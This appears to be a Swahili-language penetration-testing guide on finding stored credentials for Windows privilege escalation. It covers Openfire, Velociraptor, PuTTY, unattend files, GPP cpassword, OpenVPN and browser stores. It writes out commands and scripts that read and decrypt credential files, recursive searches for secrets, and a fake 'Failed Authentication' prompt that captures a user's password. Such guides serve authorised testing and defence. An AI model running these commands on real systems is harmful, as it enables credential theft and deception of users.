CI server inaweza kuhifadhi mabadiliko ya source yaliyowasilishwa kwenye data directory yake hata baada ya build kukamilika. [TeamCity inaeleza](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` hutumika kuhifadhi mabadiliko ya remote-run; data directory inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeo yaliyofutwa au kuongezwa kwa faili ya credential, encryption key, au script inayotumia vyote viwili. Kwa mfano, workflow ya PowerShell ya `ConvertTo-SecureString -Key` inahitaji AES key pamoja na string iliyosimbwa kwa njia fiche; [Microsoft inaeleza](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa key hutolewa kando. Kagua majina ya patches zinazoweza kufikiwa kwanza, kisha kagua maudhui husika kwa idhini bila kuchapisha siri kwenye matokeo ya kawaida ya enumeration. Njia ya patch, value iliyosimbwa kwa njia fiche, au rejeo la key pekee havithibitishi kuwa kuna credential halali au ufikiaji wa privileges za juu zaidi. Weka ACL za data directory zikiwa na vizuizi na epuka kuweka siri kwenye mabadiliko ya build.

### Mzunguko maalum wa kubadilisha password ya local administrator

Password rotator iliyotengenezwa ndani inaweza kuhifadhi password ya local administrator iliyosimbwa kwa njia fiche kwenye local service huku ikiweka datastore credentials zake kwenye faili ya `.env` inayosomeka au karibu na updater binary. Kagua scheduled task ya updater, akaunti, ACL za usanidi, listener na permissions za datastore kwa pamoja. Datastore inayosikiliza kwenye loopback pekee bado inaweza kufikiwa na local user mwenye credentials halali, lakini uthibitishaji pekee hauthibitishi ruhusa ya kusoma rekodi husika. Ikiwa encryption seed au key material inaweza kufikiwa karibu na ciphertext, kagua jinsi key halisi inavyotokana kabla ya kuamini usimbaji fiche huo. Mpango unaotumia seed iliyo wazi kutengeneza AES key kwa njia inayoweza kutabirika kwa kutumia Go [`math/rand`](https://pkg.go.dev/math/rand) haufai kulinda password hiyo; Go inaeleza kuwa package hiyo haifai kwa randomness inayohusika na usalama. Thibitisha kuwa password yoyote iliyorejeshwa bado ni halali na ni ya akaunti iliyo kwenye kundi la local Administrators kabla ya kuichukulia kama njia ya escalation. Scheduled task, njia ya `.env`, au blob iliyosimbwa kwa njia fiche pekee havithibitishi masharti hayo. Usijumuishe passwords na key material kwenye matokeo ya kawaida ya enumeration.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kusimamia passwords za local administrator. Hifadhi yake inayotegemea directory au Entra na vidhibiti vyake vya ufikiaji ni tofauti na local datastore maalum; [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) pia huamua kama mtumiaji aliyethibitishwa wa datastore anaweza kusoma index maalum.

### JAR archives za Java server plugin na matumizi tena ya credentials

Baadhi ya Java server plugins husambazwa kama JAR archives kwenye directory ya `plugins` ya server. Custom plugin inayosomeka inaweza kuwa na usanidi au bytecode yenye service credential iliyopachikwa. Kagua archive hiyo kwa idhini pekee na usijumuishe siri zilizorejeshwa kwenye matokeo ya kawaida ya enumeration. Njia ya plugin pekee haithibitishi kuwa kuna siri, na service password iliyorejeshwa huleta privileges za juu zaidi ikiwa tu inatumika pia kwa akaunti yenye privileges zaidi. Kagua ACL za faili husika na ubadilishe credentials zilizotumiwa tena kwa siri tofauti. Tazama [mwongozo wa PaperMC wa kusakinisha plugins](https://docs.papermc.io/paper/adding-plugins/) kwa muundo wa directory na [nyaraka za Oracle za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa maudhui ya archive.

### Credentials za database iliyopachikwa ya Openfire

Usakinishaji wa Openfire unaotumia database yake iliyopachikwa unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` pamoja na property ya `passwordKey`. [Nyaraka za Openfire kuhusu user-provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema passwords zinaweza kuhifadhiwa kama plain text au kusimbwa kwa njia fiche kwa key iliyohifadhiwa kwenye property hiyo. Password iliyorejeshwa ni muhimu kwa escalation ikiwa tu bado inatumika kwa utambulisho wenye privileges zaidi; jina la faili pekee halithibitishi ufikiaji wa kusoma wala matumizi tena ya credential. Njia hiyo ni kidokezo cha inventory, kwa hiyo usijumuishe maudhui ya database na credentials kwenye matokeo ya kawaida ya enumeration.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kuonyesha ports na bind interface zilizosanidiwa za admin console hata wakati database ya nje inatumika. Kwa kawaida Openfire hufunga admin console kwenye loopback; akaunti ya local bado inaweza kufikia anwani hiyo ikiwa listener inaendesha kazi. Kagua listener halisi, admin role iliyoidhinishwa, policy ya kupakia plugin na utambulisho wa Openfire service kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kusababisha plugin code kuendeshwa katika muktadha wa service, ambao unaweza kuwa na privileges za juu sana ikiwa service inaendeshwa kama LocalSystem. Password inayolingana ya akaunti au njia ya usanidi inayosomeka pekee havithibitishi ufikiaji wa admin console au utekelezaji wa code. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [property ya API ya kupakia plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa forensic management server

Usanidi wa Velociraptor server, ambao mara nyingi huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya internal CA. Ikiwa mtumiaji mwenye privileges za chini anaweza kusoma key hiyo, anaweza kutengeneza client certificate ya API. Ikiwa hili litasababisha privileges za juu zaidi hutegemea user roles za server, ufikikaji wa API na utambulisho ambao server au target agent hutumia kuendesha kazi. Client configuration ina material tofauti; kuipata hakuthibitishi ufikiaji wa server CA. Baadhi ya deployments huhifadhi CA private key nje ya mtandao, kwa hiyo huenda server configuration inayosomeka isiwe na signing key pia.

Kwenye Windows server, kagua ACL ya usanidi wa **server** kwenye installation directory yake na nakala zozote za backup zilizolindwa. Mahali panapowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa kwa service ikiwa ni tofauti. Thibitisha kuwa utambulisho wa sasa unaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha private key kwenye logs au matokeo ya enumeration. Workflow ya vendor ya `config api_client` hutumia CA key kutoa client certificate, lakini server-side role inayofaa inahitajika pia; kuunda au kubadilisha role kunaweza kuhitaji datastore write access au restart. Utambulisho wa server wenye privileges ambao tayari upo unaweza kutoa njia hata ikiwa writes hizo haziwezekani. API queries zenye ruhusa za execution huendeshwa katika muktadha husika wa server au agent, ambao unaweza kuwa na privileges za juu sana.

Linda server configuration na backups kwa ACL zenye vizuizi, weka CA signing key nje ya mtandao inapowezekana, na punguza API roles pamoja na ufikiaji wa listener. Tazama [nyaraka za Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni meneja tofauti wa session. Hifadhi yake asilia iliyosimbwa kwa njia fiche inaweza kuwa katika `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, huku nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa uhamishaji wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema kuwa faili zinazohamishwa husimbwa kwa nenosiri na zinaweza kuwa na sessions, keys, scripts, tags na relationships; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha hifadhi asilia. Kwanza kagua ruhusa za faili na njia zake. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kuwa credential yoyote iliyohifadhiwa bado ni halali au ina privileges za juu zaidi.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys kwenye registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hiyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa ni ufunguo wa SSH uliohifadhiwa. Huhifadhiwa ikiwa imesimbwa kwa njia fiche, lakini unaweza kuondoa usimbaji wake kwa urahisi ukitumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha kompyuta, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda funguo za ssh, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikubaini matumizi ya `dpapi.dll` wakati wa uthibitishaji kwa funguo zisizolingana.

### Faili zisizohudumiwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Hifadhi rudufu za SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na hives za `SAM`, `SECURITY`, na `SYSTEM` za offline. Kipaumbele kiwe kwa saraka za backup au image zinazoweza kufikiwa ndani ya kifaa, na kagua **majina ya vitu vilivyomo** kwenye image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives zimefichuliwa, na image za kawaida za `install.wim`, `boot.wim`, na recovery mara nyingi huwa njia zisizo sahihi. SMB share ni njia tofauti ya kufikia faili na inapaswa kukaguliwa tu ikiwa iko ndani ya upeo wa kazi. Tazama mwongozo wa Microsoft kuhusu [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Vitambulisho vya Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP Lililohifadhiwa kwenye Akiba

Hapo awali kulikuwa na kipengele kilichoruhusu kusambaza akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, manenosiri ndani ya GPP hizi, yaliyosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliowekwa hadharani, yangeweza kufumbuliwa na mtumiaji yeyote aliyeidhinishwa. Hili lilileta hatari kubwa, kwani lingeweza kuruhusu watumiaji kupata ruhusa za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ya kuchanganua faili za GPP zilizohifadhiwa kwenye akiba ya ndani na zilizo na sehemu ya "cpassword" isiyo tupu. Faili kama hiyo ikipatikana, kazi hiyo hufumbua nenosiri na kurudisha object maalum ya PowerShell. Object hii inajumuisha maelezo kuhusu GPP na mahali faili ilipo, hivyo kusaidia kutambua na kurekebisha dosari hii ya usalama.

Tafuta faili hizi kwenye `C:\ProgramData\Microsoft\Group Policy\history` au kwenye _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kufumbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Usanidi wa Wavuti wa IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye credentials:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Kumbukumbu za backup katika webroot ya IIS

Backup ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayohudumia faili inaweza kufichua faili za awali za usanidi na credentials zinazoweza kutumika tena. Angalia njia halisi iliyosanidiwa ya tovuti na ikiwa kumbukumbu hiyo inafikika kupitia HTTP kabla ya kuichukulia kuwa imefichuliwa. Njia chaguomsingi ya `C:\inetpub\wwwroot` ni njia inayowezekana tu. Orodha ya haraka ya faili za ndani inaweza kuonyesha majina na ukubwa bila kufungua kumbukumbu:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la jalada halithibitishi kuwa lina siri au kwamba kitambulisho kilichopatikana kinatoa ruhusa za juu zaidi.

### Vitambulisho vya OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba credentials

Unaweza daima **kumwomba mtumiaji aweke credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kumwomba** mteja moja kwa moja **credentials** ni **hatari** sana):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana kuwa na **nywila** katika **maandishi-wazi** au **Base64** wakati fulani uliopita

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Toleo la orodha ya majina ya faili bila kiendelezi cha Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 databases kwa kawaida hutumia kiendelezi cha `.psafe3`. Chukulia jina la faili linalolingana kuwa huenda ni vault iliyosimbwa kwa njia fiche; kuwepo kwake hakuthibitishi kwamba unaweza kuisoma, kuifungua, au kutumia credentials zozote zilizohifadhiwa humo. Unapokagua mahali faili kama hizo zimehifadhiwa, angalia wasifu wa watumiaji unaoweza kufikia na folda za msingi za kushiriki faili zilizosanidiwa.

KeePass `.kdbx` inayosomeka pia ni kidokezo tu cha vault iliyosimbwa kwa njia fiche. Ili kuifungua, unahitaji master-password halisi na faili yoyote ya key-file au vipengele vya akaunti vilivyosaniwa. Iwapo ukaguzi ulioidhinishwa utapata jozi ya LM:NT hash katika ingizo, thibitisha akaunti iliyotajwa na ikiwa NT hash ni ya sasa na inakubaliwa na huduma ya NTLM ya lengo kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault halikupi haki za Administrator au SYSTEM lenyewe; ufikiaji wa huduma ya mbali, haki za akaunti, na hatua yoyote tofauti ya kutekeleza huduma lazima pia viwepo. Orodha ya ukaguzi inapaswa kuripoti njia ya vault na ikiwa inasomeka, wala si kuchapisha database au credentials zilizohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Lahaja ya amri ya kutafuta bila kiendelezi cha Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Vitambulisho katika RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta vitambulisho ndani yake

Kagua maingizo ya Recycle Bin yaliyofutwa unayoweza kufikia ili kutafuta nakala rudufu na kumbukumbu za usanidi zilizofutwa, pamoja na faili ambazo majina yake yanataja wazi vitambulisho. Nakala rudufu muhimu ya `.7z`, `.zip`, au `.rar` inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa katika rekodi ya `$I`, na faili iliyofutwa kama ingizo lake la `$R` linalolingana; kagua metadata na ruhusa za kusoma za utambulisho wa sasa kabla ya kufungua kumbukumbu. Kuonekana kwa faili hutegemea volume, SID ya mtumiaji, na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kuwa hakuna nakala rudufu inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama kitu cha kukaguliwa, si uthibitisho kwamba lina siri halali.

`.pfx` iliyofutwa unayoweza kufikia inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key unayoweza kufikia, key hiyo inaweza kusaini script ya PowerShell iliyobadilishwa; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti unahitaji utambulisho wa sasa uweze kurekebisha script husika, rule inayotumika ikubali saini inayotokana nayo kwa script na akaunti lengwa, na scheduled task au programu nyingine yenye ruhusa za juu iendeshe script hiyo kweli. Jina la faili la `.pfx`, subject ya cheti, au script inayoweza kuandikwa peke yake havithibitishi mlolongo huo. Kagua metadata, ACLs, policy, na amri ya scheduled task kabla ya kufungua private-key material au kuanzisha task hiyo.

Pia kagua database za wasifu wa messaging client, noti, na faili zilizopokelewa unazoweza kufikia ili kutafuta vidokezo vya vitambulisho. Export ya BitLocker recovery inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya nakala rudufu yenye jina. Nyenzo kama hizo zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa iliyo na nakala rudufu za zamani; kagua volume na kumbukumbu hiyo tu ikiwa umeidhinishwa. Ikiwa nakala rudufu ina `NTDS.dit`, kurejesha credentials za domain nje ya mtandao pia kunahitaji hive ya `SYSTEM` inayolingana, kama ilivyoelezwa katika [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kuwa kuna recovery key au nakala rudufu ya domain inayoweza kutumika.

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Registry keys nyingine zinazoweza kuwa na vitambulisho**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Toa openssh keys kutoka kwenye registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia dbs ambako nywila za **Chrome au Firefox** zimehifadhiwa.\
Unapaswa kuangalia dbs ambako nywila za **Chrome, Edge, au Firefox** zimehifadhiwa.\
Pia angalia historia, bookmarks na favourites za vivinjari ili kuona kama **nywila zimehifadhiwa** humo.

Kwa wasifu wa kawaida wa **Default** wa Edge wa mtumiaji wa sasa, `Login Data` iko chini ya `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, huku `Local State` ikiwa katika saraka yake kuu ya `User Data`. [Microsoft inaeleza eneo chaguomsingi la wasifu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); wasifu mwingine au sera ya `UserDataDir` inaweza kuuhamisha. Kuwepo kwa faili ni kidokezo tu cha mahali pa kuhifadhi vitambulisho: thibitisha kuwa faili zinaweza kusomeka, muktadha wa DPAPI wa mtumiaji husika au nyenzo nyingine za funguo zilizoidhinishwa, na kama login iliyohifadhiwa ni ya akaunti yenye mamlaka zaidi. Kuhesabu njia pekee hakuhitaji kufungua database wala kuchapisha nywila zilizofumbuliwa.

Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kuwa `key4.db` na `logins.json` za wasifu ni faili zinazohusiana za funguo na login zilizofumbiwa. Kuwepo kwake ni kidokezo tu: angalia kama faili zote mbili zinaweza kusomeka, kama kuna ingizo zilizohifadhiwa, na kama Primary Password inalinda ufunguo kabla ya kuhitimisha kuwa vitambulisho vinaweza kutumika. Ikiwa kitambulisho kilichopatikana ni cha akaunti ya domain, kagua kando haki halisi za udhibiti wa vikundi za akaunti hiyo na [haki za kusoma au kufumbua nywila za LAPS](../active-directory-methodology/laps.md) za kikundi; mabaki ya kivinjari pekee hayathibitishi njia ya kupata mamlaka ya msimamizi.

Zana za kutoa nywila kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)** na kila kipengele hutoa utendakazi kupitia kiolesura kimoja au zaidi, vinavyotambuliwa kupitia interface IDs (IIDs).

